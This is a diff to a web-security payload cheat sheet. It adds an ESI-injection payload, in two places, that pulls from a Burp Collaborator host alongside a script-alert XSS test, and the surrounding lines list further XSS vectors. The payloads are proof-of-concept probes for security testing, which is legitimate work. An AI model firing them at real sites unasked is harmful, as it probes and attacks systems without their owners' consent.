@@ -49,6 +49,7 @@ Some helpful payloads caught in the wild
 <embed src=//14.rs>
 <marquee loop=1 width=0 onfinish=confirm(1)>
 <marquee/onstart=alert(1)>
+<esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
 ```
 
 ### XXE  
@@ -79,6 +80,10 @@ you have ESI injection
 ```
 ```xml
 <esi:include src="/anypage.html" dca="none" />
+```
+XSS  
+```
+<esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
 ```
  - https://twitter.com/alxbrsn/status/981256374230319112
  - https://t.co/XRxIalWcng?amp=1 
